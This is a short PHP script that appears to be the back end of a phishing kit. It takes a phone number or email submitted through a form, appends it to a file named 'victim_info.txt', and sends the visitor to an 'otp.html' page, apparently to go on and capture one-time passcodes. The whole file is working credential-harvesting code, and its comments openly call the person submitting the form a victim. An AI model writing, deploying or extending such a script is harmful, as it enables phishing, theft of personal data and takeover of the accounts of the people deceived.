<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Collect data from POST request
    $phone_email = htmlspecialchars($_POST['phone_email']);

    // Save victim information to file
    $info = "Phone/Email: $phone_email\n";
    file_put_contents('victim_info.txt', $info, FILE_APPEND);

    // Redirect to OTP page
    header('Location: otp.html');
    exit();
}
?>
